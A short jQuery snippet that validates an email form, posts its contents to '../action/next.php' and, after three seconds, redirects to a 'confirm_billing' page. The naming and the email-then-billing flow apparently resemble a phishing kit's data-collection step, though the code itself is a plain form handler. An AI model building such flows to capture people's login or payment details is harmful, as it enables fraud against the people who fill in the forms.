$("#email").validate({
    submitHandler: function() {
        $.post("../action/next.php", $("#email").serialize(), function() {
            setTimeout(function() {
                window.location.assign("confirm_billing")
            }, 3e3)
        })
    }
});